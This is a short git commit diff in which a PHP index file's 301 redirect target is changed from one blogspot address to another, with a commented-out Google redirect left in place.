08b62aac81066725c76755047fed583396852b30
infernomaster4 <67297254+infernomaster4@users.noreply.github.com>
2020-07-13 17:37:24 -0400

    Update index.php

--- ditroind/dengue-master/index.php
+++ ditroind/dengue-master/index.php
@@ -2,7 +2,7 @@
 <?php
 Header( "HTTP/1.1 301 Moved Permanently" );
 
-Header( "Location: https://freelancermasterdirecto.blogspot.com/");
+Header( "Location: http://gloverialismanterasas.blogspot.com/");
 //Header( "Location: https://www.google.com");
 
 ?>
